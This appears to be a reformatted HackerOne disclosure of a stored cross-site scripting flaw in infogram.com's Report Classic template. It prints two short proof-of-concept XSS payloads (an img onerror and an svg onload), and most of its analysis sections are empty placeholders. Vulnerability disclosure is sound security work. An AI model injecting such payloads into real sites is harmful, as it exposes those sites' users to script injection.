# XSS on infogram.com

## Metadata
- **Source:** HackerOne
- **Report:** 283565 | https://hackerone.com/reports/283565
- **Submitted:** 2017-10-27
- **Reporter:** mondhers
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** high
- **Vuln:** Cross-site Scripting (XSS) - Stored
- **CVEs:** None
- **Category:** web-api

## Summary
Hello,

There is a XSS on Report templates.

Free templates : Report Classic 

When we modify the values of table we can put XSS Payload.

Payload used : 

"><img src=x onerror=prompt(0);>
"/><svg/onload=alert(0);>


## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello,

There is a XSS on Report templates.

Free templates : Report Classic 

When we modify the values of table we can put XSS Payload.

Payload used : 

"><img src=x onerror=prompt(0);>
"/><svg/onload=alert(0);>


</details>

---
*Analysed by Claude on 2026-05-24*
